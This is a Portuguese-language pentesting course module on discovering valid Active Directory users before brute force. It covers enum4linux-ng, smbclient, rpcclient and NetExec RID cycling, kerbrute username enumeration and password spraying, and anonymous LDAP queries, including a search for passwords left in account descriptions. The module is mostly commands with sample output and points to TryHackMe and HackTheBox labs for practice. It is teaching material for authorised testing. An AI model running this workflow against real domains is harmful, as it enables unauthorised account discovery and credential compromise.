# 🔍 02. Reconhecimento de Usuários e Escopo

> Brute force sem lista de usuários válidos é como jogar dardos no escuro. Descubra quem existe antes de tentar entrar.

<div align="center">

| ⏱️ Tempo | 📊 Nível | 🔧 Ferramentas |
|:--------:|:--------:|:--------------:|
| 60min | ⭐⭐⭐ Intermediário | `enum4linux-ng, rpcclient, smbclient, nxc, kerbrute, ldapsearch` |

</div>

---

## 🎓 Por que isso importa?

Antes de qualquer ataque de brute force ou spraying, você precisa de uma **lista de usuários válidos**. Testar senhas contra usuários que não existem gera falsos positivos, desperdiça tempo e dispara alertas de segurança.

**Impacto real:**
- Em ambientes AD, uma null session SMB pode revelar **todos os 5.000 usuários do domínio** em segundos
- RID cycling funciona mesmo quando o anonymous bind está restrito
- kerbrute valida usuários via Kerberos **sem causar lockout** (diferente do brute force)
- Uma vez com usuários válidos, password spraying com 1 senha pode quebrar 20-30 contas

**Fluxo lógico:**
```
Este módulo (02) → Descobrir usuários válidos
       ↓
Próximo módulo (03) → Brute force/spraying usando esses usuários
```

**Se este módulo falhar:** O módulo 03 será ineficiente — você vai testar senhas contra contas fantasma.

---

## 📋 Pré-requisitos

| Conhecimento | Necessário? | Onde aprender |
|:-------------|:-----------:|:-------------:|
| O que é SMB/RPC/LDAP | Sim | Módulo 00 (portas e protocolos) |
| Nmap básico (scan de portas) | Sim | Módulo 01 |
| Terminal Linux | Sim | Módulo 00 |
| Wordlists de usuários | Sim | Arquivo 01 deste módulo |

---

## 🎯 Quando usar este módulo

- Quando Nmap mostrou porta **445 (SMB)** ou **389/636 (LDAP)** aberta
- Quando o alvo é um **servidor Windows** ou **Domain Controller**
- Antes de brute force — para ter lista de usuários válidos
- Quando quer mapear o **escopo do domínio** (usuários, grupos, computadores)

---

## 🔄 Como funciona na prática

```
┌──────────────────────────────────────────────────────────┐
│  1. TESTAR NULL SESSION (SMB anônimo)                    │
│     - enum4linux-ng -As / smbclient -L -N               │
│     - Se funcionar → enumeração completa                 │
└──────────────────────┬───────────────────────────────────┘
                       ▼
┌──────────────────────────────────────────────────────────┐
│  2. RID BRUTE FORCE (se anônimo restrito)                │
│     - rpcclient ou nxc --rid-brute                       │
│     - Testa RIDs 500-4000 para descobrir nomes           │
└──────────────────────┬───────────────────────────────────┘
                       ▼
┌──────────────────────────────────────────────────────────┐
│  3. KERBRUTE (se Kerberos disponível)                    │
│     - Valida usuários via AS-REQ (sem lockout)           │
│     - Mais silencioso que SMB para enumeração            │
└──────────────────────┬───────────────────────────────────┘
                       ▼
┌──────────────────────────────────────────────────────────┐
│  4. LDAP ENUM (se DC acessível)                          │
│     - ldapsearch com anonymous bind                      │
│     - Enumeração granular de users, groups, SPNs         │
└──────────────────────┬───────────────────────────────────┘
                       ▼
┌──────────────────────────────────────────────────────────┐
│  5. SALVAR USUÁRIOS → arquivo users.txt                  │
│     - Usar no próximo módulo (brute force / spraying)    │
└──────────────────────────────────────────────────────────┘
```

---

## 🛠️ Ferramentas

| Ferramenta | Protocolo | Quando usar |
|:-----------|:----------|:------------|
| **enum4linux-ng** | SMB/RPC | Primeiro passo — enumeração completa |
| **smbclient** | SMB | Listar e acessar shares |
| **rpcclient** | RPC/SMB | Enumeração fina de usuários/grupos |
| **NetExec/CrackMapExec** | SMB/LDAP | Validação em massa, RID brute, pass-pol |
| **kerbrute** | Kerberos | Enumeração de usuários sem lockout |
| **ldapsearch** | LDAP | Enumeração granular de AD |

---

## 📡 Passo 1: enum4linux-ng (Enumeração Completa)

### Instalação

```bash
# Pré-instalado no Kali
sudo apt install -y enum4linux-ng
```

### Flags Principais

| Flag | Descrição |
|:-----|:----------|
| `-A` | Enumeração completa (users, groups, shares, password policy, OS) |
| `-As` | Enumeração completa sem lookup NetBIOS |
| `-U` | Enumerar usuários via RPC |
| `-G` | Enumerar grupos via RPC |
| `-S` | Enumerar shares via RPC |
| `-P` | Obter password policy via RPC |
| `-R [TAMANHO]` | RID cycling (enumerar usuários por RID) |
| `-u USER` | Usuário para autenticação |
| `-p SENHA` | Senha para autenticação |
| `-oA ARQUIVO` | Exportar para JSON + YAML |

### Exemplo 1 — Enumeração anônima completa

```bash
enum4linux-ng -As 192.168.1.10
```

**✅ Output esperado (resumo):**
```
ENUM4LINUX - next generation (v1.3.10)

 =======================================
|    ENUMERATING ON 192.168.1.10       |
 =======================================

[*] enumerating users via RID cycling
[R] Rid 500 => 'Administrator'
[R] Rid 501 => 'Guest'
[R] Rid 1000 => 'NormalUser01'

[*] enumerating shares
S           IPC$            IPC           (Samba)
S           Documents       Disk          
S           Prints          Print         

[*] enumerating groups
[G] 'Domain Admins' (512)
[G] 'Domain Users' (513)
[G] 'Domain Guests' (514)

[*] getting password policy
  Minimum password length: 7
  Password history length: None
  Account lockout threshold: 0
```

**❌ Se der errado:**
| Problema | Causa | Solução |
|:---------|:------|:--------|
| `Failed to bind to server` | SMB desabilitado ou firewall | Verificar porta 445 com Nmap |
| `Permission denied` | Autenticação anônima desabilitada | Tentar com credenciais ou usar RID cycling |
| Output vazio | Host não responde | Verificar conectividade com `ping` |

---

## 📡 Passo 2: smbclient (Shares)

### Instalação

```bash
sudo apt install -y smbclient
```

### Flags Principais

| Flag | Descrição |
|:-----|:----------|
| `-L` | Listar shares disponíveis |
| `-I IP` | Endereço IP de destino |
| `-U USER[%SENHA]` | Usuário (e opcionalmente senha) |
| `-N` | Conexão sem senha (null session) |
| `-c 'COMANDO'` | Executar comando e sair |

### Exemplo 1 — Listar shares sem autenticação

```bash
smbclient -L //192.168.1.10 -N
```

**✅ Output esperado:**
```
	Sharename       Type      Comment
	---------       ----      -------
	IPC$            IPC       IPC Service (Samba 4.17.12)
	Documents       Disk      Shared Documents
	Public          Disk      Public share for all users
	print$          Disk      Printer Drivers
```

### Exemplo 2 — Conectar a share e interagir

```bash
smbclient //192.168.1.10/Documents -U 'usuario%Senh@123' -c 'ls'
```

**✅ Output esperado:**
```
  .                                   D        0  Mon Sep  8 10:30:00 2025
  ..                                  D        0  Mon Sep  8 10:30:00 2025
  relatorio.pdf                      A    284092  Mon Sep  8 09:15:00 2025
  dados.xlsx                         A     45056  Tue Sep  2 14:20:00 2025
  backups                            D        0  Wed Aug 27 11:00:00 2025
```

**Comandos interativos dentro do smbclient:**
```
smb: \> ls              # Listar arquivos
smb: \> cd backups      # Mudar diretório
smb: \> get arquivo.txt # Baixar arquivo
smb: \> put local.txt   # Enviar arquivo
smb: \> exit            # Sair
```

---

## 📡 Passo 3: rpcclient (Enumeração via RPC)

### Instalação

```bash
# Pré-instalado (dependência do enum4linux)
sudo apt install -y rpcclient
```

### Comandos Principais

| Comando | Descrição |
|:--------|:----------|
| `enumdomusers` | Listar todos os usuários do domínio |
| `enumdomgroups` | Listar todos os grupos |
| `lookupnames <user>` | Resolver nome → SID |
| `lookupsids <SID>` | Resolver SID → nome (RID cycling) |
| `queryuser <RID>` | Detalhes de um usuário por RID |
| `querydominfo` | Informações do domínio |
| `netshareenumall` | Listar todos os shares |

### Exemplo 1 — Enumeração anônima de usuários

```bash
rpcclient -U "" -N 192.168.1.10
```

**✅ Output esperado:**
```
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[NormalUser01] rid:[0x3e8]
user:[NormalUser02] rid:[0x3e9]
user:[svc_backup] rid:[0x3ea]

rpcclient $> enumdomgroups
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]

rpcclient $> querydominfo
Domain:		EMPRESA
Server:		SRV01
Total Users:	6
```

### Exemplo 2 — Detalhes de usuário específico

```bash
rpcclient $> queryuser 0x3ea
```

**✅ Output esperado:**
```
	User Name		: svc_backup
	Full Name		: Backup Service Account
	User Comment		: 
	Account Disabled	: False
	User SID		: S-1-5-21-3141592653-5897932384-626433832-1002
	Password Last Set	: Mon Jan  6, 2025 10:23:44 AM UTC
	Last logon		: Mon Sep  8, 2025 2:15:30 PM UTC
```

---

## 📡 Passo 4: NetExec/CrackMapExec (RID Brute + Pass-Pol)

### Instalação

```bash
# NetExec (sucessor, recomendado)
sudo apt install -y netexec

# Ou via pipx
pipx install netexec

# CrackMapExec (legado, ainda funcional)
sudo apt install -y crackmapexec
```

### Flags Principais

| Flag | Descrição |
|:-----|:----------|
| `-u USER` | Usuário |
| `-p PASS` | Senha |
| `-d DOMAIN` | Domínio |
| `--rid-brute [MAX]` | RID cycling (default: 4000) |
| `--pass-pol` | Obter password policy |
| `--users` | Enumerar usuários do domínio |
| `--shares` | Listar shares |
| `--continue-on-success` | Não parar no primeiro sucesso |
| `--local-auth` | Autenticação local (não-DC) |

### Exemplo 1 — RID brute force anônimo

```bash
nxc smb 192.168.1.10 -u '' -p '' --rid-brute
```

**✅ Output esperado:**
```
SMB  192.168.1.10  445  DC01  [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:EMPRESA.LOCAL) (signing:True) (SMBv1:False)
SMB  192.168.1.10  445  DC01  [+] Enumerated 56 local users using RID 0x1f4 (500)
SMB  192.168.1.10  445  DC01  EMPRESA.LOCAL\Administrator S-1-5-21-3141592653-5897932384-626433832-500
SMB  192.168.1.10  445  DC01  EMPRESA.LOCAL\Guest S-1-5-21-3141592653-5897932384-626433832-501
SMB  192.168.1.10  445  DC01  EMPRESA.LOCAL\krbtgt S-1-5-21-3141592653-5897932384-626433832-502
SMB  192.168.1.10  445  DC01  EMPRESA.LOCAL\joao.silva S-1-5-21-3141592653-5897932384-626433832-1104
SMB  192.168.1.10  445  DC01  EMPRESA.LOCAL\maria.santos S-1-5-21-3141592653-5897932384-626433832-1105
```

### Exemplo 2 — Password policy

```bash
nxc smb 192.168.1.10 -u '' -p '' --pass-pol
```

**✅ Output esperado:**
```
SMB  192.168.1.10  445  DC01  [+] Dumping password info
SMB  192.168.1.10  445  DC01  [-] Minimum password length: 8
SMB  192.168.1.10  445  DC01  [-] Password history length: 24
SMB  192.168.1.10  445  DC01  [-] Account lockout threshold: 5    ← CRÍTICO
SMB  192.168.1.10  445  DC01  [-] Account lockout duration: 30 minutes
```

> **Regra:** Se `lockout threshold: 5`, spray no máximo 3 senhas por rodada.

### Exportar usuários para arquivo

```bash
# Extrair apenas nomes de usuário
nxc smb 192.168.1.10 -u '' -p '' --rid-brute 2>/dev/null | grep -oP '[A-Z0-9_.]+\\[A-Z0-9_.]+' | cut -d'\\' -f2 > users.txt

wc -l users.txt
# 56 users.txt
```

---

## 📡 Passo 5: kerbrute (Enumeração via Kerberos)

### Instalação

```bash
# Não está no repositório padrão — baixar binário:
wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O /usr/local/bin/kerbrute
chmod +x /usr/local/bin/kerbrute
```

### Flags Principais

| Flag | Descrição |
|:-----|:----------|
| `-d, --domain` | Domínio alvo (ex: empresa.local) |
| `--dc` | IP/hostname do Domain Controller |
| `-t, --threads` | Threads (padrão: 10) |
| `-o, --output` | Arquivo de log |
| `--safe` | Abortar se detectar lockout |
| `--delay` | Delay em ms entre tentativas |

### Modos de Execução

| Comando | Descrição | Causa lockout? |
|:--------|:----------|:---------------|
| `userenum` | Enumerar usuários válidos via Kerberos | **NÃO** |
| `bruteuser` | Brute-force de senha para 1 usuário | SIM |
| `passwordspray` | Testar 1 senha em lista de usuários | SIM |

### Exemplo 1 — Enumeração de usuários (SEM lockout)

```bash
kerbrute userenum --dc 192.168.1.10 -d empresa.local usuarios.txt -t 100
```

**✅ Output esperado:**
```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1)

2025/09/08 15:45:40 >  Using KDC(s):
2025/09/08 15:45:40 >  	empresa.local:88
2025/09/08 15:45:41 >  [+] VALID USERNAME:	 administrator@empresa.local
2025/09/08 15:45:41 >  [+] VALID USERNAME:	 joao.silva@empresa.local
2025/09/08 15:45:41 >  [+] VALID USERNAME:	 maria.santos@empresa.local
2025/09/08 15:45:41 >  [+] VALID USERNAME:	 svc_backup@empresa.local
2025/09/08 15:45:42 >  Done! Tested 500 usernames (5 valid) in 1.234 seconds
```

**O que procurar:** Linhas `[+] VALID USERNAME` → usuários confirmados. A linha final mostra total testados vs válidos.

### Exemplo 2 — Password spraying via Kerberos

```bash
kerbrute passwordspray --dc 192.168.1.10 -d empresa.local usuarios_validos.txt 'Empresa2025!' --safe
```

**✅ Output esperado:**
```
2025/09/08 15:50:12 >  Using KDC(s):
2025/09/08 15:50:12 >  	empresa.local:88
2025/09/08 15:50:13 >  [+] VALID LOGIN:	 joao.silva@empresa.local:Empresa2025!
2025/09/08 15:50:13 >  [+] VALID LOGIN:	 svc_backup@empresa.local:Empresa2025!
2025/09/08 15:50:13 >  Done! Tested 150 usernames (2 valid logins) in 0.876 seconds
```

**Por que usar `--safe`:** Se o threshold de lockout for atingido, o kerbrute para automaticamente.

---

## 📡 Passo 6: LDAP Enum Anônimo

### Instalação

```bash
# Pré-instalado no Kali
sudo apt install -y ldap-utils
```

### Flags Principais

| Flag | Descrição |
|:-----|:----------|
| `-H URI` | URI do servidor LDAP |
| `-x` | Simple bind (autenticação simples) |
| `-b BASE` | Base DN para busca |
| `-s SCOPE` | Escopo: `base`, `one`, `sub` |
| `-L[L[L]]` | Output LDIF (mais legível com -LLL) |

### Exemplo 1 — Descobrir naming context (RootDSE)

```bash
ldapsearch -x -H ldap://192.168.1.10 -s base -b "" namingContexts
```

**✅ Output esperado:**
```
namingContexts: DC=empresa,DC=local
namingContexts: CN=Configuration,DC=empresa,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=empresa,DC=local
```

### Exemplo 2 — Enumeração completa de usuários

```bash
ldapsearch -x -H ldap://192.168.1.10 -b "DC=empresa,DC=local" | grep -i "sAMAccountName"
```

**✅ Output esperado:**
```
sAMAccountName: Administrator
sAMAccountName: Guest
sAMAccountName: krbtgt
sAMAccountName: Domain Admins
sAMAccountName: Domain Users
sAMAccountName: joao.silva
sAMAccountName: maria.santos
sAMAccountName: svc_backup
sAMAccountName: svc_sql
```

### Filtros LDAP Úteis

| Filtro | Descrição |
|:-------|:----------|
| `(objectClass=user)` | Todos os usuários |
| `(objectCategory=Person)` | Todas as pessoas |
| `(objectClass=group)` | Todos os grupos |
| `(&(objectClass=user)(servicePrincipalName=*))` | Usuários Kerberoastable |
| `(&(objectClass=user)(pwdLastSet=0))` | Devem trocar senha |

```bash
# Usuários com descrição (às vezes contém senhas!)
ldapsearch -x -H ldap://192.168.1.10 -b "DC=empresa,DC=local" \
  "(&(objectCategory=person)(description=*))" sAMAccountName description
```

---

## 📋 Resumo: Qual Ferramenta Usar

| Cenário | Ferramenta | Comando |
|:--------|:-----------|:--------|
| Enumeração inicial completa | enum4linux-ng | `enum4linux-ng -As <IP>` |
| Listar shares | smbclient | `smbclient -L //<IP> -N` |
| Enumeração anônima de usuários | rpcclient | `rpcclient -U "" -N <IP>` |
| RID cycling em massa | NetExec | `nxc smb <IP> -u '' -p '' --rid-brute` |
| Password policy | NetExec | `nxc smb <IP> -u '' -p '' --pass-pol` |
| Userenum sem lockout | kerbrute | `kerbrute userenum --dc <IP> -d <dom> users.txt` |
| Enumeração granular AD | ldapsearch | `ldapsearch -x -H ldap://<IP> -b "DC=dom,DC=local"` |

---

## ❌ Erros Comuns

| Erro | Causa | Solução |
|:-----|:------|:--------|
| "Null session não funciona" | Anonymous bind desabilitado | Tentar RID cycling ou kerbrute |
| "RID brute retorna 0 users" | RIDs altos demais | Aumentar max: `--rid-brute 5000` |
| "kerbrute não conecta" | DNS não resolve DC | Usar `--dc <IP>` em vez de hostname |
| "ldapsearch retorna vazio" | Anonymous bind desabilitado no AD | Usar enum4linux-ng ou nxc |
| "Não sei o domínio" | IP direto sem nome | `nxc smb <IP>` mostra domain no banner |

---

## 🧪 Labs Práticos

| # | Plataforma | Lab | O que praticar | Tempo |
|---|:----------:|:----|:---------------|:-----:|
| 1 | TryHackMe | [Active Directory Basics](https://tryhackme.com/room/adbasics) | Conceitos de AD, enumeração de usuários | 45min |
| 2 | TryHackMe | [ICE](https://tryhackme.com/room/ice) | Enumeração SMB, descoberta de shares | 60min |
| 3 | HackTheBox | [Archetype](https://app.hackthebox.com/machines/Archetype) | SMB null session, enumeração de usuários, MSSQL | 90min |

---

## 📚 Referências

- [HackTricks — Pentesting SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)
- [HackTricks — Pentesting LDAP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap)
- [PayloadsAllTheThings — AD Attack](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Tools/Active%20Directory%20Attack.md)
- [kerbrute — GitHub](https://github.com/ropnop/kerbrute)
- [NetExec Wiki](https://www.netexec.wiki/)
- [enum4linux-ng — GitHub](https://github.com/cddmp/enum4linux-ng)

---

## ✅ Validação

Após este módulo, você deve conseguir:

- [ ] Testar null session SMB com enum4linux-ng e smbclient
- [ ] Enumerar usuários via RID cycling (rpcclient ou nxc)
- [ ] Obter password policy com `nxc smb --pass-pol`
- [ ] Validar usuários via kerbrute userenum (sem lockout)
- [ ] Enumerar AD via ldapsearch com anonymous bind
- [ ] Salvar lista de usuários válidos em `users.txt` para o próximo módulo
- [ ] Saber qual ferramenta usar para cada cenário de enumeração
